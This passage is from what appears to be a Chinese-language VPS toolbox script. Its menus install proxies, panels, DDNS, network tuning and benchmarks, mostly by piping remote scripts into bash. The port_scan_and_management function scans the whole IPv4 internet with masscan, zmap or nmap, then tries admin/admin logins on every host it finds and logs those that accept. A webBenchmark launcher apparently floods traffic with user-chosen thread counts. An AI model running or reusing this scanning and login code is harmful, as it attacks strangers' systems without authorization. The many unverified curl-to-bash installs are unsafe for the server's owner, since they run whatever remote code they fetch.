        read -p "请输入需要用来 DDNS 的一级域名 (例如: baidu.com): " CFZONE_NAME
    done

    read -p "请输入 DDNS 的二级域名前缀 (例如: 123): " CFRECORD_NAME
    while [[ -z "$CFRECORD_NAME" ]]; do
        echo "二级域名前缀不能为空，请重试。"
        read -p "请输入 DDNS 的二级域名前缀 (例如: 123): " CFRECORD_NAME
    done

    sed -i "s/^CFKEY=.*/CFKEY=${CFKEY}/" /root/cf-v4-ddns.sh
    sed -i "s/^CFUSER=.*/CFUSER=${CFUSER}/" /root/cf-v4-ddns.sh
    sed -i "s/^CFZONE_NAME=.*/CFZONE_NAME=${CFZONE_NAME}/" /root/cf-v4-ddns.sh
    sed -i "s/^CFRECORD_NAME=.*/CFRECORD_NAME=${CFRECORD_NAME}/" /root/cf-v4-ddns.sh

    echo "配置文件已更新。"

    /root/cf-v4-ddns.sh

    echo "设置定时任务..."
    read -p "是否需要日志？(y/n): " log_choice

    if [ "$log_choice" = "y" ] || [ "$log_choice" = "Y" ]; then
        mkdir -p /var/log
        (crontab -l 2>/dev/null; echo "*/2 * * * * /root/cf-v4-ddns.sh >> /var/log/cf-ddns.log 2>&1") | crontab -
        echo "定时任务已设置，并将日志保存到 /var/log/cf-ddns.log。"
    else
        (crontab -l 2>/dev/null; echo "*/2 * * * * /root/cf-v4-ddns.sh >/dev/null 2>&1") | crontab -
        echo "定时任务已设置。"
    fi

    echo "运行完成。按回车键返回菜单。"
    read -r
}

chicken_king_script() {
    echo "剑皇在路上..."
    wget https://github.com/maintell/webBenchmark/releases/download/0.5/webBenchmark_linux_x64
    chmod +x webBenchmark_linux_x64

    echo "请输入线程数："
    read threads
    echo "请输入图片/文件路径："
    read file_path

    ./webBenchmark_linux_x64 -c "$threads" -s "$file_path"
    echo "开始剑皇"
    echo "按回车键返回主菜单..."
    read -r
}

enable_bbr() {
    echo "net.core.default_qdisc=fq" >> /etc/sysctl.conf
    echo "net.ipv4.tcp_congestion_control=bbr" >> /etc/sysctl.conf
    sysctl -p
    sysctl net.ipv4.tcp_available_congestion_control
    lsmod | grep bbr
    echo "BBR 已开启。按回车键返回菜单。"
    read -r
}

install_multifunction_bbr() {
    wget -N --no-check-certificate "https://gist.github.com/zeruns/a0ec603f20d1b86de6a774a8ba27588f/raw/4f9957ae23f5efb2bb7c57a198ae2cffebfb1c56/tcp.sh" && chmod +x tcp.sh && ./tcp.sh
    echo "多功能BBR安装脚本运行完成。按回车键返回菜单。"
    read -r
}

tcp_window_tuning() {
    wget http://sh.nekoneko.cloud/tools.sh -O tools.sh && bash tools.sh
    echo "TCP窗口调优完成。按回车键返回菜单。"
    read -r
}

test_access_priority() {
    curl ip.sb
    echo "访问优先级测试完成。按回车键返回菜单。"
    read -r
}

port_25_test() {
    telnet smtp.aol.com 25
    echo "25端口开放测试完成。按回车键返回菜单。"
    read -r
}

adjust_ipv_priority() {
    clear
    echo "选择一个选项来调整IPv4/IPv6的优先访问:"
    echo "1) 优先使用IPv4"
    echo "2) 优先使用IPv6"
    read -p "请输入你的选择: " ipv_choice
    case $ipv_choice in
        1)
            echo "优先使用IPv4..."
            if grep -q "precedence ::ffff:0:0/96  100" /etc/gai.conf; then
                echo "已经设置为优先使用IPv4。"
            else
                echo "precedence ::ffff:0:0/96  100" | sudo tee -a /etc/gai.conf
                echo "已设置为优先使用IPv4。"
            fi
            ;;
        2)
            echo "优先使用IPv6..."
            if grep -q "precedence ::ffff:0:0/96  100" /etc/gai.conf; then
                sudo sed -i '/^precedence ::ffff:0:0\/96  100/d' /etc/gai.conf
                echo "已设置为优先使用IPv6。"
            else
                echo "已经设置为优先使用IPv6。"
            fi
            ;;
        *)
            echo "无效的选择，请重试。"
            ;;
    esac
    echo "操作完成。按回车键返回菜单。"
    read -r
}

manage_icmp() {
    echo "选择一个选项:"
    echo -e "\033[32m1)\033[0m 启用ICMP"
    echo -e "\033[32m2)\033[0m 禁用ICMP"
    echo -e "\033[32m3)\033[0m 返回上一级菜单"
    read -p "请输入你的选择: " icmp_choice
    case $icmp_choice in
        1)
            sudo sed -i '/net.ipv4.icmp_echo_ignore_all/d' /etc/sysctl.conf
            echo "net.ipv4.icmp_echo_ignore_all=0" | sudo tee -a /etc/sysctl.conf
            sudo sysctl -p
            echo "ICMP已启用"
            ;;
        2)
            sudo sed -i '/net.ipv4.icmp_echo_ignore_all/d' /etc/sysctl.conf
            echo "net.ipv4.icmp_echo_ignore_all=1" | sudo tee -a /etc/sysctl.conf
            sudo sysctl -p
            echo "ICMP已禁用"
            ;;
        3)
            echo "返回上一级菜单"
            return
            ;;
        *)
            echo "无效的选择，请重试。"
            ;;
    esac
    echo "操作完成。按回车键返回菜单。"
    read -r
}

install_warp_script() {
    clear
    echo "运行 WARP 安装脚本..."
    wget -N https://gitlab.com/fscarmen/warp/-/raw/main/menu.sh && bash menu.sh
    echo "运行完成。按回车键返回菜单。"
    read -r
}

manage_vnstat() {
    while true; do
        clear
        echo "请选择操作:"
        echo "1) 安装并启动 vnStat"
        echo "2) 查看日流量统计"
        echo "3) 卸载 vnStat"
        echo "4) 返回主菜单"
        read -p "请输入你的选择: " choice

        case $choice in
            1)
                echo "安装 vnStat..."
                sudo apt-get update
                sudo apt-get install -y vnstat

                echo "启动 vnStat 服务..."
                sudo systemctl start vnstat
                sudo systemctl enable vnstat

                echo "vnStat 安装并启动完成。"
                read -p "按任意键继续..."
                ;;
            2)
                echo "查看日流量统计..."
                vnstat -d
                read -p "按任意键继续..."
                ;;
            3)
                echo "卸载 vnStat..."
                sudo systemctl stop vnstat
                sudo systemctl disable vnstat
                sudo apt-get purge -y vnstat
                sudo rm -rf /var/lib/vnstat
                echo "vnStat 已卸载。"
                read -p "按任意键继续..."
                ;;
            4)
                return 0
                ;;
            *)
                echo "无效的选择，请重试。"
                read -p "按任意键继续..."
                ;;
        esac
    done
}

manage_iftop() {
    while true; do
        clear
        echo "请选择操作:"
        echo "1) 安装 iftop"
        echo "2) 运行 iftop"
        echo "3) 卸载 iftop"
        echo "4) 返回主菜单"
        read -p "请输入你的选择: " choice

        case $choice in
            1)
                echo "安装 iftop..."
                sudo apt-get update
                sudo apt-get install -y iftop
                echo "iftop 安装完成。"
                read -p "按任意键继续..."
                ;;
            2)
                echo "运行 iftop..."
                read -p "请输入要监控的网络接口 (例如 eth0): " interface
                sudo iftop -i $interface
                read -p "按任意键继续..."
                ;;
            3)
                echo "卸载 iftop..."
                sudo apt-get remove -y iftop
                sudo apt-get purge -y iftop
                echo "iftop 已卸载。"
                read -p "按任意键继续..."
                ;;
            4)
                return 0
                ;;
            *)
                echo "无效的选择，请重试。"
                read -p "按任意键继续..."
                ;;
        esac
    done
}

install_and_remove_old_kernel() {
    clear

    if [ "$(uname -m)" != "x86_64" ]; then
        echo "错误：此脚本仅支持64位系统。"
        echo "请使用64位系统运行此脚本。按回车键返回菜单。"
        read -r
        return
    fi

    echo "更新包列表..."
    sudo apt-get update

    echo "查找当前内核版本..."
    current_kernel=$(uname -r)
    echo "当前内核版本：$current_kernel"

    echo "查找已安装的内核包..."
    installed_kernels=$(dpkg --list | grep linux-image | grep -v "$current_kernel" | awk '{print $2}')
    echo "已安装的内核包：$installed_kernels"

    echo "卸载旧内核..."
    for kernel in $installed_kernels; do
        sudo apt-get remove -y --purge "$kernel"
    done

    echo "安装 linux-image-cloud-amd64 内核..."
    sudo apt-get install -y linux-image-cloud-amd64

    echo "清理无用的包..."
    sudo apt-get autoremove --purge -y

    echo "更新 GRUB 配置..."
    sudo update-grub

    echo "linux-image-cloud-amd64 内核安装完成，旧内核已卸载。"

    while true; do
        read -p "是否立即重启系统以使新内核生效？（y/n）: " yn
        case $yn in
            [Yy]* ) echo "系统将在几秒钟后重启..."; sleep 3; sudo reboot; break;;
            [Nn]* ) echo "请记得稍后手动重启系统以使新内核生效。按回车键返回菜单。"; read -r; break;;
            * ) echo "请输入 y 或 n。";;
        esac
    done
}

clear_kernel_optimizations() {
    clear
    echo "正在清空内核优化参数..."

    sudo tee /etc/sysctl.conf > /dev/null <<EOF
EOF

    sudo sysctl -p

    echo "内核优化参数已清空。"
    echo "按回车键继续..."
    read -r
}


xray_management() {
    clear
    echo -e "\033[32mxray 管理\033[0m"
    echo -e "\033[32m1)\033[0m 安装 VLESS-TLS-SplitHTTP-H3"
    echo -e "\033[32m2)\033[0m 安装 xtls-rprx-vision-reality"
    echo -e "\033[32m3)\033[0m 删除 xray"
    echo -e "\033[32m4)\033[0m 开启 xray"
    echo -e "\033[32m5)\033[0m 重启 xray"
    echo -e "\033[32m6)\033[0m 查看 xray 状态"
    echo -e "\033[32m7)\033[0m 返回主菜单"
    read -p "请输入你的选择: " xray_choice
    case $xray_choice in
        1) install_vless_tls_splithttp_h3 ;;
        2) install_xtls_rprx_vision_reality ;;
        3) bash -c "$(curl -L https://github.com/XTLS/Xray-install/raw/main/install-release.sh)" @ remove --purge ;;
        4) sudo systemctl start xray ;;
        5) sudo systemctl restart xray ;;
        6) sudo systemctl status xray ;;
        7) return ;;
        *) echo "无效的选择，请重试。" ;;
    esac
    echo "操作完成。按回车键返回菜单。"
    read -r
}

install_vless_tls_splithttp_h3() {
    clear
    echo "正在下载并执行 install_vless.sh 脚本..."
    wget -N https://raw.githubusercontent.com/cccchiban/BCSB/main/install_vless.sh && bash install_vless.sh
    echo "脚本执行完成。按回车键返回菜单。"
    read -r
}

install_xtls_rprx_vision_reality() {
    clear
    echo "正在下载并执行 install_xray.sh 脚本..."
    wget -N https://raw.githubusercontent.com/cccchiban/BCSB/main/install_xray.sh && bash install_xray.sh
    echo "脚本执行完成。按回车键返回菜单。"
    read -r
}

install_mieru_script() {
    clear
    echo "运行Mieru安装脚本..."
    wget -N https://raw.githubusercontent.com/cccchiban/BCSB/main/mieru.sh && bash mieru.sh
    echo "运行完成。按回车键返回菜单。"
    read -r
}

install_v2bx_script() {
    clear
    echo "运行v2bx一键安装脚本..."
    wget -N https://raw.githubusercontent.com/wyx2685/V2bX-script/master/install.sh && bash install.sh
    echo "安装完成。按回车键返回菜单。"
    read -r
}

install_v2ray-agent_script() {
    clear
    echo "运行v2ray-agent八合一键脚本..."
    wget -P /root -N "https://raw.githubusercontent.com/mack-a/v2ray-agent/master/install.sh" && chmod 700 /root/install.sh && /root/install.sh
    echo "安装完成。按回车键返回菜单。"
    read -r
}

install_Aurora_script() {
    clear
    echo "安装极光转发面板..."
    bash <(curl -fsSL https://raw.githubusercontent.com/Aurora-Admin-Panel/deploy/main/install.sh)
    echo "安装完成。按回车键返回菜单。"
    read -r
}

install_xiandan_script() {
    clear
    echo "安装咸蛋转发面板..."
    bash <(wget --no-check-certificate -qO- 'https://sh.xdmb.xyz/xiandan/xd.sh')
    echo "安装完成。按回车键返回菜单。"
    read -r
}

install_xboard() {
    echo "开始安装 Xboard..."

    if dpkg -l | grep -q docker; then
        echo "Docker 已经安装，跳过安装步骤。"
    else
        echo "安装 Docker..."
        curl -sSL https://get.docker.com | bash
        systemctl enable docker
        systemctl start docker
        echo "Docker 安装完成！"
    fi

    echo "获取 Docker Compose 文件..."
    git clone -b docker-compose --depth 1 https://github.com/cedar2025/Xboard
    cd Xboard || { echo "克隆仓库失败"; exit 1; }
    echo "Docker Compose 文件获取完成！"

    echo "执行数据库安装命令..."
    docker compose run -it --rm xboard php artisan xboard:install
    echo "数据库安装命令执行完成！请记录返回的后台地址和管理员账号密码。"

    echo "启动 Xboard..."
    docker compose up -d
    echo "Xboard 启动完成！"

    IP_ADDRESS=$(hostname -I | awk '{print $1}')

    echo "你现在可以访问你的站点了。默认端口为7001。"
    echo "网站地址: http://$IP_ADDRESS:7001/"

    read -p "安装完成，按回车键返回主菜单..."
}

install_hy2_script() {
    clear
    echo "请选择安装脚本："
    echo "1. 使用自带hy2脚本 "
    echo "2. 使用masakano hy2安装脚本 "
    echo "请输入选项 (1 或 2)："
    read -r option

    case $option in
        1)
            echo "运行hy2安装脚本1..."
            curl -sS -O https://raw.githubusercontent.com/cccchiban/BCSB/main/hy2.sh && chmod +x hy2.sh && ./hy2.sh
            ;;
        2)
            echo "运行hy2安装脚本2..."
            wget -N --no-check-certificate https://raw.githubusercontent.com/Misaka-blog/hysteria-install/main/hy2/hysteria.sh && bash hysteria.sh
            ;;
        *)
            echo "无效的选项，请重新运行脚本并选择 1 或 2。"
            return
            ;;
    esac

    echo "安装完成。按回车键返回菜单。"
    read -r
}

install_dns_unlock_script() {
    echo "请选择操作："
    echo "1. 运行 DNS 解锁脚本"
    echo "2. 卸载 DNS 解锁脚本"
    read -rp "请输入选择 (1 或 2): " choice

    if [[ "$choice" == "1" ]]; then
        wget --no-check-certificate -O dnsmasq_sniproxy.sh https://raw.githubusercontent.com/myxuchangbin/dnsmasq_sniproxy_install/master/dnsmasq_sniproxy.sh
        bash dnsmasq_sniproxy.sh -f
        
        read -rp "是否限制 IP 访问？(y/n): " limit_ip
        if [[ "$limit_ip" == "y" ]]; then
            if ! command -v iptables &> /dev/null; then
                echo "iptables 未安装，正在安装..."
                apt-get update && apt-get install -y iptables
            fi
            
            iptables -A INPUT -p tcp --dport 53 -j DROP
            
            read -rp "请输入需要添加的白名单 IP（多个 IP 用空格分隔）: " -a whitelist_ips
            for ip in "${whitelist_ips[@]}"; do
                iptables -I INPUT -p tcp -s "$ip" --dport 53 -j ACCEPT
            done
            
            iptables-save > /etc/iptables/rules.v4
            echo "IP 访问限制已设置。"
        fi
        
        echo "DNS 解锁脚本安装完成。按回车键返回菜单。"
        read -r
    elif [[ "$choice" == "2" ]]; then
        wget --no-check-certificate -O dnsmasq_sniproxy.sh https://raw.githubusercontent.com/myxuchangbin/dnsmasq_sniproxy_install/master/dnsmasq_sniproxy.sh
        bash dnsmasq_sniproxy.sh -u
        
        iptables -D INPUT -p tcp --dport 53 -j DROP
        
        echo "DNS 解锁脚本卸载完成。53 端口限制已移除。按回车键返回菜单。"
        read -r
    else
        echo "无效选择，请重新运行脚本。"
    fi
}

port_scan_and_management() {
    clear
    echo "方法来自https://www.nodeseek.com/post-1084-1"
    echo "端口扫描有可能导致vps清退或收到abuse，请谨慎操作"
    echo "1) 安装端口扫描工具并进行端口扫描和弱口令尝试"
    echo "2) 卸载端口扫描工具"
    echo "3) 退出"
    read -p "请输入选项 (1-3): " operation

    case $operation in
        1)
            echo "正在安装必要的软件包..."
            sudo apt update
            sudo apt install -y nmap zmap masscan

            echo "选择扫描工具："
            echo "1) masscan"
            echo "2) zmap"
            echo "3) nmap"
            read -p "请输入选项 (1-3): " scan_tool

            read -p "请输入目标端口 (默认: 54321): " target_port
            target_port=${target_port:-54321}

            read -p "请输入扫描结果输出文件名 (默认: scan.log): " scan_output
            scan_output=${scan_output:-scan.log}

            case $scan_tool in
                1)
                    echo "使用 masscan 进行端口扫描..."
                    sudo masscan 0.0.0.0/0 -p$target_port --banners --exclude 255.255.255.255 -oJ scan.json
                    scan_file="scan.json"
                    ;;
                2)
                    echo "使用 zmap 进行端口扫描..."
                    sudo zmap --target-port=$target_port --output-file=$scan_output
                    scan_file=$scan_output
                    ;;
                3)
                    echo "使用 nmap 进行端口扫描..."
                    sudo nmap -sS 0.0.0.0/0 -p $target_port | grep -v failed > $scan_output
                    scan_file=$scan_output
                    ;;
                *)
                    echo "无效选项，退出..."
                    return
                    ;;
            esac

            echo "扫描完成，开始尝试弱口令登录..."

            week_log="week.log"
            all_log="all.log"

            > $week_log
            > $all_log

            for ip_ad in $(sed -nE 's/.*"ip": "([^"]+)".*/\1/p' $scan_file); do
                if curl --max-time 1 http://$ip_ad:$target_port; then
                    res=$(curl "http://${ip_ad}:$target_port/login" --data-raw 'username=admin&password=admin' --compressed --insecure)
                    if [[ "$res" =~ .*true.* ]]; then
                        echo $ip_ad | tee -a $week_log
                    fi
                    echo $ip_ad | tee -a $all_log
                fi
            done

            echo "弱口令尝试完成。"
            echo "可以弱口令登录的机器保存在 $week_log。"
            echo "所有被扫描的机器保存在 $all_log。"
            ;;
        2)
            echo "正在卸载端口扫描工具..."
            sudo apt remove -y nmap zmap masscan
            echo "端口扫描工具卸载完成。"
            ;;
        3)
            echo "退出..."
            exit 0
            ;;
        *)
            echo "无效选项，退出..."
            return
            ;;
    esac

    echo "按回车键返回菜单。"
    read -r
}

install_ss_plugins() {
    clear
    echo "脚本来自：https://github.com/loyess/Shell"
    wget -N --no-check-certificate -c -t3 -T60 -O ss-plugins.sh https://git.io/fjlbl
    chmod +x ss-plugins.sh
    ./ss-plugins.sh
    echo "ss-plugins 安装脚本运行完成。按回车键返回菜单。"
    read -r
}

233boy_xray() {
    clear
    bash <(wget -qO- -o- https://github.com/233boy/Xray/raw/main/install.sh)
    echo "Xray 安装脚本运行完成。按回车键返回菜单。"
    read -r
}

realm_gost_Forward() {
    clear
    echo "请选择要执行的操作："
    echo "1) Realm 转发"
    echo "2) Gost 转发"
    echo "3) 返回上级菜单"
    read -p "请输入你的选择 (1-3): " choice

    case $choice in
        1)
            clear
            echo "脚本来自：https://www.nodeseek.com/post-171363-1"
            wget -N https://raw.githubusercontent.com/qqrrooty/EZrealm/main/realm.sh && chmod +x realm.sh && ./realm.sh
            ;;
        2)
            clear
            wget --no-check-certificate -O gost.sh https://raw.githubusercontent.com/qqrrooty/EZgost/main/gost.sh && chmod +x gost.sh && ./gost.sh
            ;;
        3)
            return
            ;;
        *)
            echo "无效的选择，请重试。"
            ;;
    esac

    echo "操作完成。按回车键返回菜单。"
    read -r
}


comprehensive_test_script() {
    clear
    echo "选择一个综合测试脚本:"
    echo -e "\033[32m1)\033[0m 融合怪"
    echo -e "\033[32m2)\033[0m NodeBench"
    read -p "请输入你的选择: " test_choice
    case $test_choice in
        1)
            bash <(wget -qO- --no-check-certificate https://gitlab.com/spiritysdx/za/-/raw/main/ecs.sh)
            ;;
        2)
            bash <(curl -sL https://raw.githubusercontent.com/LloydAsp/NodeBench/main/NodeBench.sh)
            ;;
        *)
            echo "无效的选择，请重试。"
            ;;
    esac
    echo "脚本运行完成。按回车键返回菜单。"
    read -r
}

performance_test_script() {
    clear
    echo "选择一个性能测试脚本:"
    echo -e "\033[32m1)\033[0m GB5 完整测试脚本"
    echo -e "\033[32m2)\033[0m yabs GB6 完整测试脚本"
    echo -e "\033[32m3)\033[0m GB6 测试脚本-跳过网络磁盘测试"
    echo -e "\033[32m4)\033[0m GB5 测试脚本-跳过网络磁盘测试"
    echo -e "\033[32m5)\033[0m 秋水逸冰-bench测试脚本"
    echo -e "\033[32m6)\033[0m NodeQuality测试脚本"
    read -p "请输入你的选择: " perf_choice
    case $perf_choice in
        1)
            bash <(wget -qO- https://raw.githubusercontent.com/i-abc/GB5/main/gb5-test.sh)
            ;;
        2)
            curl -sL yabs.sh | bash
            ;;
        3)
            curl -sL yabs.sh | bash -s -- -fi
            ;;
        4)
            curl -sL yabs.sh | bash -s -- -fi5
            ;;
        5)
            wget --no-check-certificate https://raw.githubusercontent.com/teddysun/across/master/bench.sh -O bench.sh && bash bench.sh
            ;;
        6)
            bash <(curl -sL https://run.NodeQuality.com)
            ;;
        *)
            echo "无效的选择，请重试。"
            ;;
    esac
    echo "脚本运行完成。按回车键返回菜单。"
    read -r
}

media_ip_quality_test_script() {
    clear
    echo "选择一个流媒体及 IP 质量测试脚本:"
    echo -e "\033[32m1)\033[0m media测试脚本"
    echo -e "\033[32m2)\033[0m check检测脚本1"
    echo -e "\033[32m3)\033[0m Check检测脚本2"
    echo -e "\033[32m4)\033[0m Check IP 质量体检脚本"
    echo -e "\033[32m5)\033[0m ChatGPT 解锁检测"
    read -p "请输入你的选择: " media_choice
    case $media_choice in
        1)
            bash <(curl -L -s media.ispvps.com)
            ;;
        2)
            bash <(curl -L -s check.unlock.media)
            ;;
        3)
            bash <(curl -L -s https://github.com/1-stream/RegionRestrictionCheck/raw/main/check.sh)
            ;;
        4)
            bash <(curl -sL IP.Check.Place)
            ;;
        5)
            echo "选择 ChatGPT 解锁检测的版本:"
            echo "1) 安卓"
            echo "2) 苹果"
            read -p "请输入你的选择: " chatgpt_choice

            parse_result() {
                local result=$1
                if echo "$result" | grep -q '"cf_details"'; then
                    echo "解锁"
                elif echo "$result" | grep -q '"message":"request is not allowed"'; then
                    echo "解锁"
                elif echo "$result" | grep -q '"message":"Something went wrong"'; then
                    echo "不解锁"
                elif echo "$result" | grep -q '"message":"OpenAI’s services are not available in your country or region."'; then
                    echo "IP所在地区\国家openai不提供服务"
                else
                    echo "无法确定解锁状态"
                fi
            }

            case $chatgpt_choice in
                1)
                    result=$(curl -s android.chat.openai.com)
                    parse_result "$result"
                    ;;
                2)
                    result=$(curl -s ios.chat.openai.com)
                    parse_result "$result"
                    ;;
                *)
                    echo "无效的选择，请重试。"
                    ;;
            esac
            ;;
        *)
            echo "无效的选择，请重试。"
            ;;
    esac
    echo "脚本运行完成。按回车键返回菜单。"
    read -r
}

network_speed_test_script() {
    clear
    echo "选择一个三网测速脚本:"
    echo -e "\033[32m1)\033[0m Speedtest"
    echo -e "\033[32m2)\033[0m Taier"
    echo -e "\033[32m3)\033[0m hyperspeed"
    echo -e "\033[32m4)\033[0m 全球测速"
    read -p "请输入你的选择: " speedtest_choice
    case $speedtest_choice in
        1)
            bash <(curl -sL https://raw.githubusercontent.com/i-abc/Speedtest/main/speedtest.sh)
            ;;
        2)
            bash <(curl -sL res.yserver.ink/taier.sh)
            ;;
        3)
            bash <(curl -Lso- https://bench.im/hyperspeed)
            ;;
        4)
            curl -sL network-speed.xyz | bash
            ;;
        *)
            echo "无效的选择，请重试。"
            ;;
    esac
    echo "脚本运行完成。按回车键返回菜单。"
    read -r
}

backtrace_test_script() {
    clear
    echo "选择一个回程测试脚本:"
    echo -e "\033[32m1)\033[0m 直接显示回程"
    echo -e "\033[32m2)\033[0m backtrace重构版（推荐）"
    read -p "请输入你的选择: " backtrace_choice
    case $backtrace_choice in
        1)
            curl https://raw.githubusercontent.com/ludashi2020/backtrace/main/install.sh -sSf | sh
            ;;
        2)  bash <(curl -sSf https://raw.githubusercontent.com/vpsxb/testrace/main/testrace.sh) backtrace
            ;;
        *)
            echo "无效的选择，请重试。"
            ;;
    esac
    echo "脚本运行完成。按回车键返回菜单。"
    read -r
}

iperf3_test_script() {
    clear
    echo "正在下载并运行 iperf3 测试脚本..."
    curl -L https://raw.githubusercontent.com/cccchiban/BCSB/main/iperf3_test.sh -o iperf3_test.sh && chmod +x iperf3_test.sh && ./iperf3_test.sh
    echo "脚本运行完成。按回车键返回菜单。"
    read -r
}

function_script() {
    while true; do
        clear
        echo "选择一个选项:"
        echo -e "\033[32m1)\033[0m Fail2ban"
        echo -e "\033[32m2)\033[0m 添加SWAP"
        echo -e "\033[32m3)\033[0m 更改SSH端口"
        echo -e "\033[32m4)\033[0m 科技lion一键脚本工具"
        echo -e "\033[32m5)\033[0m BlueSkyXN 综合工具箱"
        echo -e "\033[32m6)\033[0m Docker备份/恢复脚本"
        echo -e "\033[32m7)\033[0m btop进程管理"
	echo -e "\033[32m8)\033[0m BetterForward tg群组机器人替身"
	echo -e "\033[32m9)\033[0m vps防滥用脚本"
        echo -e "\033[32m10)\033[0m 返回主菜单"
        read -p "请输入你的选择: " function_choice
        case $function_choice in
            1)
                wget --no-check-certificate https://raw.githubusercontent.com/FunctionClub/Fail2ban/master/fail2ban.sh && bash fail2ban.sh 2>&1 | tee fail2ban.log
                ;;
            2)
                wget https://www.moerats.com/usr/shell/swap.sh && bash swap.sh
                ;;
            3)
                read -p "请输入新的SSH端口: " new_ssh_port
                if [[ -z "$new_ssh_port" || ! "$new_ssh_port" =~ ^[0-9]+$ ]]; then
                    echo "无效的端口，请重试。"
                else
                    sudo sed -i "s/^#Port 22/Port $new_ssh_port/" /etc/ssh/sshd_config
                    sudo sed -i "s/^Port [0-9]*/Port $new_ssh_port/" /etc/ssh/sshd_config
                    sudo systemctl restart sshd

                    if command -v ufw > /dev/null; then
                        sudo ufw allow "$new_ssh_port"/tcp
                        sudo ufw reload
                        echo "UFW: 已放行端口 $new_ssh_port"
                    elif command -v firewall-cmd > /dev/null; then
                        sudo firewall-cmd --permanent --add-port="$new_ssh_port"/tcp
                        sudo firewall-cmd --reload
                        echo "firewalld: 已放行端口 $new_ssh_port"
                    elif command -v iptables > /dev/null; then
                        sudo iptables -A INPUT -p tcp --dport "$new_ssh_port" -j ACCEPT
                        sudo iptables-save > /etc/iptables/rules.v4
                        echo "iptables: 已放行端口 $new_ssh_port"
                    else
                        echo "未检测到已知的防火墙，如有必要可手动放行 $new_ssh_port 端口"
                    fi
                fi
                ;;
            4)
                curl -sS -O https://kejilion.pro/kejilion.sh && chmod +x kejilion.sh && ./kejilion.sh
                ;;
            5)
                wget -O box.sh https://raw.githubusercontent.com/BlueSkyXN/SKY-BOX/main/box.sh && chmod +x box.sh && clear && ./box.sh
                ;;
            6)
                echo "脚本项目地址：https://github.com/ceocok/Docker_container_migration/tree/main"
                echo "备份过程中 源服务器会临时占用 Nginx 端口 8889，请勿中断脚本。"
                sleep 1
                if [ -f "Docker_container_migration.sh" ]; then
                    ./Docker_container_migration.sh
                else
                    curl -O https://raw.githubusercontent.com/ceocok/Docker_container_migration/refs/heads/main/Docker_container_migration.sh
                    chmod +x Docker_container_migration.sh
                    ./Docker_container_migration.sh
                fi
                ;;
            7)
                echo -e "\033[32m1)\033[0m 安装并启动btop"
                echo -e "\033[32m2)\033[0m 卸载btop"
                echo -e "\033[32m3)\033[0m 返回上一级菜单"
                read -p "请输入你的选择: " btop_choice
                case $btop_choice in
                    1)
                        sudo apt-get update
                        sudo apt install btop
                        btop
                        ;;
                    2)
                        sudo apt-get remove --purge btop
                        echo "btop已卸载。"
                        ;;
                    3)
                        ;;
                    *)
                        echo "无效的选择，请重试。"
                        ;;
                esac
                ;;
            8)
                curl -sS -O https://raw.githubusercontent.com/cccchiban/BCSB/main/BetterForward.sh && chmod +x BetterForward.sh && ./BetterForward.sh
                ;;
            9)
                curl -sS -O https://raw.githubusercontent.com/cccchiban/BCSB/main/shield.sh && chmod +x shield.sh && ./shield.sh
                ;;

            10)
                return
                ;;
            *)
                echo "无效的选择，请重试。"
                ;;
        esac
        echo "脚本运行完成。按回车键返回菜单。"
        read -r
    done
}

install_common_env_software() {
    while true; do
        clear
        echo -e "\033[32m请选择要安装的项目:\033[0m"
        echo -e "\033[32m1)\033[0m docker"
        echo -e "\033[32m2)\033[0m Python"
        echo -e "\033[32m3)\033[0m Aria2"
        echo -e "\033[32m4)\033[0m aaPanel(宝塔国际版)"
        echo -e "\033[32m5)\033[0m 宝塔"
        echo -e "\033[32m6)\033[0m 宝塔开心版"
        echo -e "\033[32m7)\033[0m 1Panel"
        echo -e "\033[32m8)\033[0m 耗子面板"
        echo -e "\033[32m9)\033[0m 哪吒监控"
	echo -e "\033[32m10)\033[0m MCSManager MC开服面板"
	echo -e "\033[32m11)\033[0m Komari 探针"
	       echo -e "\033[32m12)\033[0m 返回主菜单"
	       read -p "请输入你的选择: " install_choice
	       case $install_choice in
            1)
                echo "选择 docker 安装版本:"
                echo "1) 国外专用"
                echo "2) 国内专用"
                echo "3) 自定义安装源"
                read -p "请输入你的选择: " docker_choice
                case $docker_choice in
                    1)
                        curl -sSL https://get.docker.com/ | sh
                        ;;
                    2)
                        curl -sSL https://get.daocloud.io/docker | sh
                        ;;
                    3)
                        read -p "请输入自定义Docker安装源URL: " custom_url
                        if [[ -z "$custom_url" ]]; then
                            echo "URL不能为空，请重试。"
                        else
                            curl -sSL "$custom_url" | sh
                        fi
                        ;;
                    *)
                        echo "无效的选择，请重试。"
                        ;;
                esac
                ;;
            2)
                curl -O https://raw.githubusercontent.com/lx969788249/lxspacepy/master/pyinstall.sh && chmod +x pyinstall.sh && ./pyinstall.sh
                ;;
            3)
                wget -N git.io/aria2.sh && chmod +x aria2.sh && ./aria2.sh
                ;;
            4)
                URL=https://www.aapanel.com/script/install_7.0_en.sh && if [ -f /usr/bin/curl ];then curl -ksSO "$URL" ;else wget --no-check-certificate -O install_7.0_en.sh "$URL";fi;bash install_7.0_en.sh aapanel
                ;;
            5)
                url=https://download.bt.cn/install/install_lts.sh;if [ -f /usr/bin/curl ];then curl -sSO $url;else wget -O install_lts.sh $url;fi;bash install_lts.sh ed8484bec
                ;;
            6)
                echo "请访问：https://bt.sb/bbs/forum-37-1.html 获取"
                ;;
            7)
                curl -sSL https://resource.fit2cloud.com/1panel/package/quick_start.sh -o quick_start.sh && bash quick_start.sh
                ;;
            8)
                echo "请选择操作："
                echo "1) 安装耗子面板"
                echo "2) 卸载耗子面板"
                read -p "请输入你的选择: " haozi_choice
                case $haozi_choice in
                    1)
                        HAOZI_DL_URL="https://dl.cdn.haozi.net/panel"
                        curl -sSL -O ${HAOZI_DL_URL}/install_panel.sh && curl -sSL -O ${HAOZI_DL_URL}/install_panel.sh.checksum.txt && sha256sum -c install_panel.sh.checksum.txt && bash install_panel.sh || echo "Checksum 验证失败，文件可能被篡改，已终止操作"
                        ;;
                    2)
                        HAOZI_DL_URL="https://dl.cdn.haozi.net/panel"
                        curl -sSL -O ${HAOZI_DL_URL}/uninstall_panel.sh && curl -sSL -O ${HAOZI_DL_URL}/uninstall_panel.sh.checksum.txt && sha256sum -c uninstall_panel.sh.checksum.txt && bash uninstall_panel.sh || echo "Checksum 验证失败，文件可能被篡改，已终止操作"
                        ;;
                    *)
                        echo "无效的选择，请重试。"
                        ;;
                esac
                ;;
            9)
                curl -L https://raw.githubusercontent.com/naiba/nezha/master/script/install.sh -o nezha.sh && chmod +x nezha.sh && sudo ./nezha.sh
                ;;
            10)
                echo "请选择操作："
                echo "1) 安装 MCSManager MC开服面板"
                echo "2) 手动安装 MCSManager (适用于安装失败的情况)"
                read -p "请输入你的选择: " mcsmanager_choice
